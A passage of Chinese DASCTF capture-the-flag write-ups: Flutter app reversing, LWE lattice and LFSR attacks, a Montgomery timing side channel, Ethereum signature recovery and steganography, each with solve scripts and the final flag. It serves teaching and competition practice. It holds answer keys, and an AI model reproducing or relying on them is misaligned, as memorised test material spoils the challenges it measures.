EvB2udc3ofALSbCxeH5j4O2QZjfyZ151Nj3tOBVpt+99XXudbbzYknID0CxFcVO5+Vf16SjxzVbCuOizTIm3TVXXprsM1IlyjzJnTIUc8s4cFIX+clb1zN5PqUm11Z9LDlUMGYu+fa0fZqB5o7EMXWJvl+uKOsk/K3zzrnU0Rdpn/Ylm0ZBBDqpaNDYeXkGM52Uj6NxOhRRMaW2VcH/u4rNg7y7/X6OKa68G2TstGohwelnKpzgp4eFBNxn2<-encryptinput->UBUSWb+1P3Z/aokV67e5xQ7eaHoEj3JAeC0XA1RckTWdWZYCB/+D7qC3Hao74goX
```

以：<-encryptinput->作为分隔，前面的是经过RC4+Base64加密的key和iv，后面是经过AES-CBC加密的真正flag

```plain
UBUSWb+1P3Z/aokV67e5xQ7eaHoEj3JAeC0XA1RckTWdWZYCB/+D7qC3Hao74goX
```



**步骤4：解密**

第一步解密题目附件的字符串：

<img src="https://c.img.dasctf.com/LightPicture/2024/10/056dc05b4fc6d9f1.png" width="1915" title="null" crop="0,0,1,1" id="n1HOI" class="ne-image">

然后解密获得的enkey+eniv

<img src="https://c.img.dasctf.com/LightPicture/2024/10/3de0657db10a8d8d.png" width="1917" title="null" crop="0,0,1,1" id="hLpTg" class="ne-image">

<img src="https://c.img.dasctf.com/LightPicture/2024/10/c5b9dc2c001fe952.png" width="1907" title="null" crop="0,0,1,1" id="dQD5u" class="ne-image">



得到iv和key

key：ElmGJYfKbc2gJh0G

iv：JZ4tQgwSm3ZZIELJ

<img src="https://c.img.dasctf.com/LightPicture/2024/10/c25493253f4f9bd7.png" width="1920" title="null" crop="0,0,1,1" id="WqGH8" class="ne-image">

DASCTF{android_encrypto_file_and_plains}



**步骤5：提交FLAG**

DASCTF{android_encrypto_file_and_plains}

将正确的FLAG提交至题目平台，验证解题成功。

## 题目-androidfff
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| androidfff | 逆向 | 困难 |


### FLAG
+ DASCTF{flutter_is_so_easy}

### 知识点
1. JADX静态分析
2. SO文件动态调试
3. android-flutter逆向
4. 异或加密
5. so文件混淆
6. 复杂数据类型逆向

### 解题步骤
**步骤1：获取目标程序**

下载并查看题目附件，是一个flutter逆向

首先，对于flutter逆向，我们需要借助工具：reflutter或者blutter，根据选手喜好自行选择

本题采用了blutter方式来进行符号恢复和解题

关于blutter的安装

可以参考文章[https://github.com/worawit/blutter](https://github.com/worawit/blutter)

需要全程开启代理

安装完成后

<img src="https://c.img.dasctf.com/LightPicture/2024/10/550051d39fdaf8c1.png" width="878" title="null" crop="0,0,1,1" id="QAvIY" class="ne-image">

打开

<img src="https://c.img.dasctf.com/LightPicture/2024/10/862440208fc0ba76.png" width="424" title="null" crop="0,0,1,1" id="PDpVp" class="ne-image">

将目标app：androidfff，提取其libapp.so文件，架构选择arm64

<img src="https://c.img.dasctf.com/LightPicture/2024/10/9b255c549432421a.png" width="918" title="null" crop="0,0,1,1" id="cawP2" class="ne-image">



在x64 Native命令行运行命令（路径根据自己的来选择）

```plain
python D:\24ByteDanceCTF\bytedance\blutter-main\blutter.py D:\24ByteDanceCTF\bytedance\blutter-main\androidfff\lib\arm64-v8a .\androidfff_un
```

即可得到恢复符号的相关文件

<img src="https://c.img.dasctf.com/LightPicture/2024/10/081890d560eebf9c.png" width="976" title="null" crop="0,0,1,1" id="eWNak" class="ne-image">

```plain
asm: 具有符号的libapp.so的汇编代码。
ida_script: IDA脚本，用于还原libapp.so的符号。
blutter_frida.js: 针对目标应用程序的 Frida 脚本模板。
objs.txt: 对象池中 Object 的完整（嵌套）转储。
pp.txt: 对象池中所有 Dart 对象的转储。
```

本题个人解法是结合汇编+IDA动态调试获取密文和定位关键加密算法进行解密，另一种快速的方法是采用frida来做，道理都是一样的。

前期环境搭建完成，在第二步开始进行分析



**步骤2：静态分析**

使用反编译工具JADX对目标程序进行静态分析，发现是flutter程序，代码均在libapp.so文件里面（flutter编程基本知识）

<img src="https://c.img.dasctf.com/LightPicture/2024/10/854ff7f4ab2ab779.png" width="1343" title="null" crop="0,0,1,1" id="jOKKO" class="ne-image">

使用IDA打开libapp.so文件，推荐arm64架构+真机环境

<img src="https://c.img.dasctf.com/LightPicture/2024/10/629150f0aa7cbed2.png" width="553" title="null" crop="0,0,1,1" id="IRITt" class="ne-image">

flutter逆向自带代码混淆+函数名称混淆，在第一步我们使用blutter解密libapp.so获得了相关符号文件

其中有一个：addNames.py 文件可以使用IDA运行，恢复相关符号

<img src="https://c.img.dasctf.com/LightPicture/2024/10/38de36178d43c684.png" width="1637" title="null" crop="0,0,1,1" id="h8q0e" class="ne-image">

有一部分符号会被恢复，帮助分析

<img src="https://c.img.dasctf.com/LightPicture/2024/10/b0ad7dc48c05c45a.png" width="1133" title="null" crop="0,0,1,1" id="xevJ5" class="ne-image">

同时我们打开asm文件夹，阅读经过反编译后的汇编伪代码

<img src="https://c.img.dasctf.com/LightPicture/2024/10/40437debc523f3b7.png" width="424" title="null" crop="0,0,1,1" id="sh6Bl" class="ne-image">

分析：main.dart

<img src="https://c.img.dasctf.com/LightPicture/2024/10/45c669ac2975714b.png" width="1662" title="null" crop="0,0,1,1" id="uEJDj" class="ne-image">

我们搜索地址，定位到关键函数checkflag

<img src="https://c.img.dasctf.com/LightPicture/2024/10/cc05fec295d7bdfd.png" width="1772" title="null" crop="0,0,1,1" id="wqqrh" class="ne-image">

分析完汇编，然后我们去分析so文件(这些地址可以在IDA直接搜索定位)

<img src="https://c.img.dasctf.com/LightPicture/2024/10/ec2809b84c1b6ea8.png" width="1618" title="null" crop="0,0,1,1" id="P3aHc" class="ne-image">



<img src="https://c.img.dasctf.com/LightPicture/2024/10/d8de16a1ca6e4cfb.png" width="1657" title="null" crop="0,0,1,1" id="JXhjG" class="ne-image">

到这里，我们有两种选择，使用提供的frida脚本或者采用IDA动态调试（推荐真机）去发现异或的key和密文

静态分析不能够获得密文，key可以经过阅读汇编获得。

<img src="https://c.img.dasctf.com/LightPicture/2024/10/7b016a95e7b5d59c.png" width="1604" title="null" crop="0,0,1,1" id="e8ysS" class="ne-image">

静态经过阅读汇编可以猜测key是0x32（推荐动态调试获得）



**步骤3：定位密文**

在程序中找到存储或生成密文的位置。

<img src="https://c.img.dasctf.com/LightPicture/2024/10/8ec48f5facb93277.png" width="1449" title="null" crop="0,0,1,1" id="WxZwb" class="ne-image">

IDA动态调试分析跟踪函数collection$ src $equality_ListEquality__equals_29c880

<img src="https://c.img.dasctf.com/LightPicture/2024/10/b931e4bfc05d8796.png" width="1386" title="null" crop="0,0,1,1" id="ljGeR" class="ne-image">

经过一步一步动态调试，逐步获得密文

条件断点输出也是不错的方法

一步一步提取密文



**步骤4：分析解密算法**

经过前面步骤的分析，我们得到异或的key为0x32

密文为：

```plain
    unsigned char ciphertext[] = {
        0x76, 0x73, 0x61, 0x71, 0x66,
        0x74, 0x49, 0x54, 0x5e, 0x47,
        0x46, 0x46, 0x57, 0x40, 0x6d,
        0x5b, 0x41, 0x6d, 0x41, 0x5d,
        0x6d, 0x57, 0x53, 0x41, 0x4b,
        0x4f
    };

```

下一步开始解密



**步骤5：编写解密脚本**

根据分析结果编写解密脚本，解密密文以获得FLAG。

```python
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>

int main() {
    // 定义密钥和密文
    unsigned char key = 0x32;
    unsigned char ciphertext[] = {
        0x76, 0x73, 0x61, 0x71, 0x66,
        0x74, 0x49, 0x54, 0x5e, 0x47,
        0x46, 0x46, 0x57, 0x40, 0x6d,
        0x5b, 0x41, 0x6d, 0x41, 0x5d,
        0x6d, 0x57, 0x53, 0x41, 0x4b,
        0x4f
    };

    // 计算密文长度
    size_t length = 26;

    // 用于存储明文
    unsigned char plaintext[26];

    // 异或解密
    for (size_t i = 0; i < length; i++) {
        plaintext[i] = ciphertext[i] ^ key;  // 进行异或操作
    }

    // 输出明文
    printf("Decrypted Plaintext:\n");
    for (size_t i = 0; i < length; i++) {
        printf("%c", plaintext[i]);
    }

    printf("\n");

    return 0;
}
```

DASCTF{flutter_is_so_easy}



**步骤6：验证FLAG**

将解密得到的FLAG与题目要求的格式进行比对，确保正确。

<img src="https://c.img.dasctf.com/LightPicture/2024/10/830018b1966cf26f.png" width="554" title="null" crop="0,0,1,1" id="TEKKa" class="ne-image">



**步骤7：提交FLAG**

将正确的FLAG提交至题目平台，验证解题成功。

# CRYPTO
## 题目-two_examples
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| two_examples | CRYPTO | 困难 |


### FLAG
+ DASCTF{Y0U_Can_S01ve_The_lwe!!!!}

### 知识点
1. 矩阵运算
2. LWE问题格攻击优化
3. RSA解密

### 解题步骤
1.从文件读取数据并转化为对应类型

```python
import json

with open('M.matrix', 'r') as f:
    data = json.load(f)

A_list = eval(data['A'])
B_list = eval(data['B'])
p = int(eval(data["p"]))

A = matrix(GF(p), A_list)
B = matrix(GF(p), B_list)

with open("v.vector", "r") as f:
    data = json.load(f)

b1_list = eval(data["b1"])
b2_list = eval(data["b2"])

b1 = matrix(GF(p),b1_list) 
b2 = matrix(GF(p),b2_list)
```



2.等式变形

$ s_1*A +s_2*B + e_{1} = b_{1}\\
s_2*A +s_1*B + e_{2} = b_{2} $

观察上面两个式子，我们可以尝试把两个式子相加和相减，得到

$ (s_1 +s_2)*(A+B) + (e_{1}+e_{2}) = (b_{1}+b_{2})\\
(s_1 -s_2)*(A-B) + (e_{1}-e_{2}) = (b_{1}-b_{2})\\
以第一个式子为例,分别把(s_1 +s_2)看成s,把(e_{1}+e_{2})看成e,把(A+B)看成A\_,把(b_{1}+b_{2})看成b\\
那我们就得到了一个LWE样本 s*A\_ + e = b,其中e是一个小量\\
等式2也是同理 $

3.LWE问题原始攻击

如果这里的s是小量，我们可以采取LWE的原始攻击

也就是                      $ s_{1*n}*A_{n*m} + e_{1*m} = b_{1*m} \ mod \ p $

这里考虑格子

    $ L = \begin{bmatrix}
A_{(n*m)} & 0_{(n*1)}&E_{(n*n)}\\b_{(1*m)}&e_{max}&0\\p*E_{(m*m)}&0&0\end{bmatrix} $

E为单位矩阵

$ v= \begin{pmatrix}s_{(1*n)}&-1 & k_{(1*m)}\end{pmatrix} * \begin{bmatrix}
A_{(n*m)} & 0_{(n*1)}&E_{(n*n)}\\b_{(1*m)}&e_{max}&0\\p*E_{(m*m)}&0&0\end{bmatrix} = \begin{pmatrix}e_{(1*m)}&-e_{max}&s_{(1*n)}\end{pmatrix} $

这样就可以了规约出来了

但对于这题来说，s并不是一个小量，这种方法并不可行



4. LWE问题优化     

$ s_{1*n}*A_{n*m} + e_{1*m} = b_{1*m} \ mod \ p $



这里可以把A分块

$ s_{1*n}*(A1_{n*n}|A2_{n*(m-n)}) + e_{1*m} = b_{1*m} \ mod \ p $

根据原始攻击

我们构造

$ L = \begin{bmatrix}
A1_{(n*n)} & A2_{(n*(m-n))}&0_{n*1}&E_{(n*n)}\\b_{(1*n)}&b_{(1*(m-n))}&e_{max}&0_{1*n}\\p*E_{(n*n)}&0_{n*(m-n)}&0_{n*1}&0_{n*n}\\
0_{(m-n)*n}& p*E_{((m-n)*(m-n))} & 0_{(m-n)*1}&0_{(m-n)*n}
\end{bmatrix} $

当然这样还是会规约出s

我们对原式进行变换

$ s*A1*(A1^{-1}*A1|A1^{-1}*A) + (e1|e2) = (b1|b2)\ mod \ p \\
这样之后我们把s*A1看成新的s\_\\
那原来格子的A1的位置就可以变成E单位矩阵了\\
这样做有一个好处：由于s\_和单位矩阵相乘还是s\_且一定是小于p的，和b相减就是e,那就可以省去下面的模p\\
同时可以删除右边的单位矩阵的n列，变成\\
L = \begin{bmatrix}
E & A1^{-1}*A2&0\\b1&b2&1\\
0& p*E & 0
\end{bmatrix} $

规约之后

$ v= \begin{pmatrix}s\_&-1 & k\end{pmatrix} * \begin{bmatrix}
E & A1^{-1}*A2&0\\b1&b2&e_{max}\\
0& p*E & 0
\end{bmatrix} = \begin{pmatrix}e1&e2&-1\end{pmatrix} $

这样就可以成功规约出e来再解个矩阵即可恢复s

同理对第二个式子也进行这样的操作，就能恢复第二个式子中的s

代码如下：

```python
n = 20
m = 30
#(s1+s2)*(A+B) + (e1+e2) = b1+b2
A_ = A+B
P = (A_[:n,:n])^(-1)
A2 = P*(A_[:n,n:])
b = b1+b2
b = matrix(b)
I1 = identity_matrix(n)
I2 = identity_matrix(m-n)
O1 = vector([0 for _ in range(n)])
O1 = matrix(O1).T
O2 = zero_matrix(m-n,n)
O3 = vector([0 for _ in range(m-n)])
O3 = matrix(O3).T
b_1 = matrix(b[:1,:n])
b_2 = matrix(b[:1,n:])
L = block_matrix(ZZ,
    [
        [I1,A2,O1],
        [O2,I2*p,O3],
        [b_1,b_2,1]

    ])

e = vector(Zmod(p),L.LLL()[0][:-1])
s_1 = matrix(Zmod(p), A_).solve_left(b-matrix(e))

#(s1-s2)*(A-B) + (e1-e2) = b1-b2
A_ = A-B
P = (A_[:n,:n])^(-1)
A2 = P*(A_[:n,n:])
b = b1-b2
b = matrix(b)
I1 = identity_matrix(n)
I2 = identity_matrix(m-n)
O1 = vector([0 for _ in range(n)])
O1 = matrix(O1).T
O2 = zero_matrix(m-n,n)
O3 = vector([0 for _ in range(m-n)])
O3 = matrix(O3).T
b_1 = matrix(b[:1,:n])
b_2 = matrix(b[:1,n:])
L = block_matrix(ZZ,
    [
        [I1,A2,O1],
        [O2,I2*p,O3],
        [b_1,b_2,1]

    ])
e = vector(Zmod(p),L.LLL()[0][:-1])
s_2 = matrix(Zmod(p), A_).solve_left(b-matrix(e))
```

注意这里求出来的并不是s1和s2,需要再解个方程

```python
s1 = matrix(GF(p),(s_1+s_2)*inverse(2,p))
s2 = matrix(GF(p),(s_1-s_2)*inverse(2,p))
```

4.RSA解密

有了s1和s2,就可计算出d的初始量，之后累加爆破私钥，尝试RSA解密

```python
def vector_to_sha512_hex(v):
    
    vector_str = ''.join(str(v[0,i]) for i in range(n))
    res = sha512(vector_str.encode()).hexdigest()
    res = int(res,16)
    return res
d = vector_to_sha512_hex(s1) + vector_to_sha512_hex(s2)

with open("RSA.enc", "r") as f:
    data = json.load(f)

N = int(eval(data["N"]))
c = int(eval(data["c"]))

while 1:
    try:
        flag = long_to_bytes(power_mod(c,d,N))
        if b"DASCTF" in flag:
            print(flag)
            break
        d = d+1
    except:
        continue
```

## 题目-lost LFSR key
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| lost LFSR key | CRYPTO | 困难 |


### FLAG
+ DASCTF{f1nd_th3_hidden_Linear_R3lat1onShip_@nd_th3n_F1nd_My_Lo5t_KEY!!!}

### 知识点
2. LFSR
3. ASCII可见字符串MSB利用
4. 离散密钥流反推种子
5. 线性代数核空间爆破
6. ASCII字符串decode

### 解题步骤
1. 本题基于LFSR，生成一个64bit的初始种子作为起始state，以及64bit的掩码mask，随后用该LFSR生成64x8bit的流密钥并与长64字节的flag串异或，给出mask和密文，要求还原flag。一般LFSR的思路是搜集足够的密钥流，从而可以倒序反推出种子，进一步就可以预测任意时刻的输出。然而本题只给了一个密文，并没有连续的密钥流。



2. 突破点在于flag串是ASCII码串，其数值位于32-127，因此其每个字节MSB位会固定为0。而由于每个state都是64位，所以对于长64的flag串来说，我们恰好能搜集到LFSR离散的64个密钥流——密文的每个字节的MSB就是LFSR产生的密钥流对应的比特。而LFSR是线性的操作，这代表着其产生的任意位置的比特，都是初始状态经过线性运算得到的。我们可以把这个线性操作写成矩阵形式：

$ L = 
\left(
 \begin{matrix}
&1&&\\
&&1&\\
&&&\ddots\\
&&&&1\\
mask_0&mask_1&mask_2&\cdots&mask_{63}\\
  \end{matrix}
\right) $

3. 那么LFSR的每一次递推就可以写成一个矩阵方程：

$ \left(
 \begin{matrix}
&1&&\\
&&1&\\
&&&\ddots\\
&&&&1\\
mask_0&mask_1&mask_2&\cdots&mask_{63}\\
  \end{matrix}
\right)

\left(
 \begin{matrix}
s_{i}\\
s_{i+1}\\
s_{i+2}\\
\vdots\\
s_{i+63}
  \end{matrix}
\right)
=
\left(
 \begin{matrix}
s_{i+1}\\
s_{i+2}\\
s_{i+3}\\
\vdots\\
s_{i+64}
  \end{matrix}
\right) $

4. 但我们要的是初始state和任意state的线性关系，因此我们要利用上递推矩阵的幂次。比如当前state对于初始state来说递推了k次，那么其对应矩阵方程为：

$ L^kS_0 = S_k $

5. 而我们拥有的每8次递推的state的第一个比特，因此我们能搜集到64个如下线性等式：

$ T = L^t[-1] $

6. 这里是取最后行的意思，那么就有：

$ T
\left(
 \begin{matrix}
s_{i}\\
s_{i+1}\\
s_{i+2}\\
\vdots\\
s_{i+63}
  \end{matrix}
\right)
=
\left(
 \begin{matrix}
s_{t}
  \end{matrix}
\right) $

7. 把这样的64组等式拼接起来就得到了一个可以求解的矩阵方程：

$ \left(
 \begin{matrix}
T_0\\
T_1\\
T_2\\
\vdots\\
T_{63}
  \end{matrix}
\right)
\left(
 \begin{matrix}
s_{i}\\
s_{i+1}\\
s_{i+2}\\
\vdots\\
s_{i+63}
  \end{matrix}
\right)
=
\left(
 \begin{matrix}
s_{t0}\\
s_{t1}\\
s_{t1}\\
\vdots\\
s_{t63}\\
  \end{matrix}
\right) $

8. 解这个矩阵方程就可以得到我们需要的初始state。需要注意的是由于系数矩阵并不满秩，所以有小规模的核空间，因此需要以齐次方程通解+非齐次特解的形式在解空间爆破，并对所有解空间中的state递推密钥流，从而与密文异或并做ASCII可见字符串的decode来得到最终flag。

## 题目-Serration
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| Serration | Crypto | 困难 |


### FLAG
+ 动态flag

### 知识点
1. 蒙哥马利算法的了解
2. 计时侧信道特征分析
3. 概率侧信道统计
4. coppersmith

### 解题步骤
题目描述中说蒙哥马利抗侧信道，但抗侧信道的是蒙哥马利阶梯，而题目用的是蒙哥马利约简。  
题目返回了600次蒙哥马利乘法的的函数运行情况分析，基于定时的侧信道分析往往考察分支的恒时性，这里主要考察的就是mon_pro中的if分支的恒时性问题。注意到蒙哥马利乘之后发生的if分支（被称为额外约简）的发生概率与执行乘法操作的数字大小有关，概率约为$$ P_p(a)=\frac{a \mod p}{p} $$，作图可以发现这个概率分布就是锯齿状。而我们有HW(e)次执行pro(x,a)操作，可以将这个概率转换为频率统计，于是在p,q附近时，存在一个这一行代码发生次数或时间急速下降的过程。在返回列表中找到对应的行号获取发生次数或时间，然后开始进行分析。  
首先不妨假定p<q由于同bit数，于是p<q<2p，于是有p<sup>2<n<2p</sup>2，即sqrt(n/2)<p<sqrt(n),为让锯齿更加明显，我们取(sqrt(n)/2,sqrt(n))的区间进行采样，注意到1024bit p需要576比特进行高位泄露，于是留给我们的测试条数只有20余条，考虑用7次机会划分为6个区间采样，可以看到锯齿，  
<img src="https://c.img.dasctf.com/LightPicture/2024/07/b1dd87733af88371.png" width="1249" title="null" crop="0,0,1,1" id="LfB8c" class="ne-image">  
然后对断崖所在的小区间进行进一步划分  
<img src="https://c.img.dasctf.com/LightPicture/2024/07/b517ecf9c260732b.png" width="1280" title="null" crop="0,0,1,1" id="jNXgE" class="ne-image">  
第三次就发现锯齿区间平稳了。  
<img src="https://c.img.dasctf.com/LightPicture/2024/07/9f6373befa1207d0.png" width="1280" title="null" crop="0,0,1,1" id="BJKec" class="ne-image">  
这时获取锯齿左侧和右侧的值，得到左侧明显高于右侧。取二者均值作为临界点，考虑使用二分法获取剩下的比特。然后coppersmith进行p高位泄露恢复。即可拿到结果。

需要注意的是，执行蒙哥马利乘法的值应该为蒙哥马利形式，但在输入到设备时我们使用的是普通形式的值，于是在推测时，对于使用的a,需要自己输入蒙哥马利形式的输入值aM，计算方案为aM=((a)*r_inv)%n，其中r_inv是2**bits在模n下的逆。可通过源码进行本地测试发现这个特征，或者通过题目描述发现特征。

# MISC
## 题目-DigitalSignature
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| DigitalSignature | Misc | 简单 |


### FLAG
```plain
DASCTF{0x2b2D44D5325F0d3550296686BE2a7b5Fecb952cB}
```

### 知识点
1. 数字签名基础
2. 身份验证
3. 区块链
4. 以太坊
5. EIP191

### 解题步骤
1. 通过题目代码分析得知，需要根据给出的`MessageHash`和`Signature`还原出签名该消息的账户的地址。<img src="https://c.img.dasctf.com/images/20221017/1666009160674-d4a7551b-3146-4670-bc69-4dec67bd509a.png" width="1491" title="null" crop="0,0,1,1" id="m27hU" class="ne-image">
2. 由于签名的生成方式已经给出，所以选手即使对这方面不太了解，也可以通过搜索文档进行解答。在`web3py`的中找到`recoverHash`函数即可对签名进行验证。当然也可以使用其他工具或是自行根据[以太坊 EIP-191](https://eips.ethereum.org/EIPS/eip-191)编写脚本或合约进行签名验证。<img src="https://c.img.dasctf.com/images/20221017/1666009160700-9173db0f-17c9-49f6-b99f-2e985d3ede69.png" width="1058" title="null" crop="0,0,1,1" id="Ct0ER" class="ne-image">
3. 运行以下脚本即可得出消息的签名者的账户地址为`0x2b2D44D5325F0d3550296686BE2a7b5Fecb952cB`，根据题目描述，`flag`为`DASCTF{0x2b2D44D5325F0d3550296686BE2a7b5Fecb952cB}`。

```python
from web3 import Web3


def RecoverMessageByHash(MessageHash: str, Signature: str) -> str:
    Provider = Web3()
    Signer = Provider.eth.account.recoverHash(MessageHash, signature=Signature)
    return Signer


MessageHash = "0x61a78e3c572c1615a6ddd0a0e20157d22b72b8c217cb247318f2c791f4ab6b85"
Signature = "0x019c4c2968032373cb8e19f13450e93a1abf8658097405cda5489ea22d3779b57815a7e27498057a8c29bcd38f9678b917a887665c1f0d970761cacdd8c41fb61b"

print(RecoverMessageByHash(MessageHash, Signature))

```

## 题目-stegh小鬼
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| stegh小鬼 | MISC | 中等 |


### FLAG
+ DASCTF{Y0u_are_4_1ovely_Gh0st}

### 知识点
1. 文件修复
2. steghide隐写
3. aaencode编码
4. base100编码
5. emoji-aes

### 解题步骤
下载附件，发现是一个加密压缩包和一个无后缀文件

先把无后缀文件拖入winhex看看

<img src="https://c.img.dasctf.com/images/20221023/1666505554153-82c850cd-b5be-4c23-9dd9-2754653db43f.gif" width="528" title="null" crop="0,0,1,1" id="aDkoP" class="ne-image">

仔细看上图的文件头和下图的文件尾其实是jpg格式的文件尾和文件头的翻转

<img src="https://c.img.dasctf.com/images/20221023/1666505556389-105b44c6-d560-4663-8598-7c65e0a8ea89.gif" width="528" title="null" crop="0,0,1,1" id="Jomwr" class="ne-image">

用python脚本给它翻转回来

```python
a = '1.txt'#存储文件的16进制

with open(a, 'r') as f:
  d = f.read()
  s = d[::-1]

with open('1.jpg', 'wb') as f1:
  f1.write(bytes.fromhex(s))
```

得到一张图片

<img src="https://c.img.dasctf.com/images/20221023/1666505559150-73a634e4-2e44-4504-bb9b-b3cda9091391.gif" width="234" title="null" crop="0,0,1,1" id="lAPFz" class="ne-image">

binwalk一下该图片，或者在winhex中搜索jpg格式的文件头都能发现这其实是两张jpg拼接而成的图片

**binwalk -e 1.jpg**

<img src="https://c.img.dasctf.com/images/20221023/1666505562872-d1003290-6f83-4e02-a1cd-6681dcc51c57.gif" width="528" title="null" crop="0,0,1,1" id="yw3pS" class="ne-image">

可以使用foremost将图片分离出来，也可以winhex手动分离

这里是foremost分离

**foremost 1.jpg**

<img src="https://c.img.dasctf.com/images/20221023/1666505566035-9343f201-4a3f-43a5-a152-f14f911889da.gif" width="528" title="null" crop="0,0,1,1" id="rAbtM" class="ne-image">

成功分离出另一张图片，先看看图片的属性

在分离出的这张图片属性中看到了新佛曰，在线网站解码

[http://hi.pcmoe.net/buddha.html](http://hi.pcmoe.net/buddha.html)

<img src="https://c.img.dasctf.com/images/20221023/1666505568799-77babb7c-7cfe-4a2f-b2f5-1247922bbd92.gif" width="528" title="null" crop="0,0,1,1" id="wMIds" class="ne-image">

得到一个pass：2333333，发现这并不是压缩包的密码

题目名称为stegh小鬼，这就是一个提示，这里需要用到steghide解密，而密码就是2333333

这里两张jpg图片都能试试解密，会发现是第二张（也就是被分离出的这张图片）有steghide隐写

**steghide extract -sf 2.jpg -p 2333333**

<img src="https://c.img.dasctf.com/images/20221023/1666505571797-00ff40e8-13d2-406f-afc1-62eabac1a61f.gif" width="528" title="null" crop="0,0,1,1" id="n8nna" class="ne-image">

能看到解出了一个pass.txt

<img src="https://c.img.dasctf.com/images/20221023/1666505574505-03ff0134-b8b9-49cc-a0e4-c218d3ba32db.gif" width="528" title="null" crop="0,0,1,1" id="CMrnw" class="ne-image">

能发现有一堆的颜文字，但是中间穿插了许多表情，根据提示：可爱鬼总喜欢做一些奇奇怪怪的表情，根据表情和颜文字的编码能想到这是aaencode和base100编码，将表情单独按照顺序分出来，作为base100解密(这里需要仔细些，不能有空格和漏分)

aaencode：

[http://www.atoolbox.net/Tool.php?Id=703](http://www.atoolbox.net/Tool.php?Id=703)

<img src="https://c.img.dasctf.com/images/20221023/1666505580153-e531a3a8-54fd-41d4-978d-9eddfad52169.gif" width="528" title="null" crop="0,0,1,1" id="GhpEJ" class="ne-image">

base100：

[http://www.atoolbox.net/Tool.php?Id=936](http://www.atoolbox.net/Tool.php?Id=936)

<img src="https://c.img.dasctf.com/images/20221023/1666505582945-7580bcb5-d69d-435a-9e58-74f6b994fad6.gif" width="528" title="null" crop="0,0,1,1" id="Lhiz5" class="ne-image">

aaencode得到

<img src="https://c.img.dasctf.com/images/20221023/1666505585578-f057dcab-5607-449e-b98e-f3dc95512e71.gif" width="528" title="null" crop="0,0,1,1" id="FukAc" class="ne-image">

Look carefully at the middle of the picture，让我们仔细观察图片之间，而我们知道刚开始得到的jpg是由两张图片拼接而成的，因此能够想到是最初始图片的中间（这一步如果在分离过程中仔细观察也能发现中间是有一段base64编码

<img src="https://c.img.dasctf.com/images/20221023/1666505587884-99a3aa08-71bd-43c9-ac0e-c562ae8ba6b6.gif" width="528" title="null" crop="0,0,1,1" id="ev2qT" class="ne-image">

解码得到Zippass:KAG_gka_kag_GKA

得到了刚开始加密压缩包的密码，解压下来

<img src="https://c.img.dasctf.com/images/20221023/1666505590779-85e671b3-1f1e-4ca4-ab77-76f006cec21f.gif" width="528" title="null" crop="0,0,1,1" id="LQpOI" class="ne-image">

能发现txt还是一堆表情，而这个便是emoji-aes，key在前面的base100便能得到

<img src="https://c.img.dasctf.com/images/20221023/1666505593571-58db93b8-363c-4f10-80ae-4cb69dcd1c2a.gif" width="528" title="null" crop="0,0,1,1" id="oEMmN" class="ne-image">

key：This_1s_P4ssw0rd

进行emoji-aes解密

[https://github.com/aghorler/emoji-aes](https://github.com/aghorler/emoji-aes)

<img src="https://c.img.dasctf.com/images/20221023/1666505596118-44a90a98-9440-48ab-bc24-b00983950dab.gif" width="528" title="null" crop="0,0,1,1" id="vQodf" class="ne-image">

得到最后的flag

<img src="https://c.img.dasctf.com/images/20221023/1666505599004-42bb318d-aead-402a-85f3-da3dfa8a2494.gif" width="527" title="null" crop="0,0,1,1" id="fWBrr" class="ne-image">

DASCTF{Y0u_are_4_1ovely_Gh0st}

## 题目-Steganography_challenges0.2
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| Steganography_challenges0.2 | misc | 困难 |


### FLAG
+ DASCTF{You_Are_StEg_Master}

### 知识点
1. python代码混淆
2. 单像素rgb值rc4加解密
3. 变异lsb隐写
4. 加密lsb隐写
5. fft水印读取

### 解题步骤
首先看到题目

<img src="https://c.img.dasctf.com/LightPicture/2024/10/7953c92bc1a334b3.png" width="913" title="null" crop="0,0,1,1" id="RqtYf" class="ne-image">

题目的外观属实诡异（，打开010看一下16进制数据

<img src="https://c.img.dasctf.com/LightPicture/2024/10/99bdcb0d323a053d.png" width="1155" title="null" crop="0,0,1,1" id="XBykC" class="ne-image">

发现有base，

<img src="https://c.img.dasctf.com/LightPicture/2024/10/af1f35753de248ad.png" width="878" title="null" crop="0,0,1,1" id="uqxxi" class="ne-image">

解密出python代码，发现可读性很差，猜测使用了python 的混淆

下面的注释里面写了进行混淆使用的项目地址[https://github.com/liftoff/pyminifier](https://github.com/liftoff/pyminifier)

但是这个因为原始的加密逻辑并不复杂，所以这里偷个懒（也算是降低了题目整体的难度）只有使用gpt帮我们还原一下就好

```plain
from PIL import Image
from Crypto.Cipher import ARC4

# 创建 ARC4 加密器
def encrypt_pixel_data(data, key):
    cipher = ARC4.new(key.encode())  # 使用 key 生成加密器
    return cipher.encrypt(data)  # 对数据进行加密

# 读取并处理图像
input_image = Image.open('your_image.png').convert('RGB')  # 打开图像并转换为 RGB 模式
width, height = input_image.size  # 获取图像的宽度和高度

# 创建一张新的图像用于保存加密后的结果
output_image = Image.new('RGB', (width, height))

encryption_key = 'monkey'  # 使用的加密密钥

# 遍历每个像素并加密
for y in range(height):
    for x in range(width):
        r, g, b = input_image.getpixel((x, y))  # 获取当前像素的 RGB 值
        pixel_data = bytes([r, g, b])  # 将 RGB 值转换为字节数据
        encrypted_data = encrypt_pixel_data(pixel_data, encryption_key)  # 对像素数据进行加密
        output_image.putpixel((x, y), (encrypted_data[0], encrypted_data[1], encrypted_data[2]))  # 保存加密后的像素

# 保存加密后的图像
output_image.save('encrypted_image.png')

```

还原出可读性较好的python代码

写解密脚本

```plain
from PIL import Image
from Crypto.Cipher import ARC4

def rc4_decrypt(data, key):
    cipher = ARC4.new(key.encode())
    return cipher.decrypt(data)
encrypted_image = Image.open('encrypted_image.png').convert('RGB')
width, height = encrypted_image.size

decrypted_image = Image.new('RGB', (width, height))
key = 'monkey'
for y in range(height):
    for x in range(width):
        r, g, b = encrypted_image.getpixel((x, y))
        encrypted_rgb_bytes = bytes([r, g, b])
        decrypted_rgb = rc4_decrypt(encrypted_rgb_bytes, key)
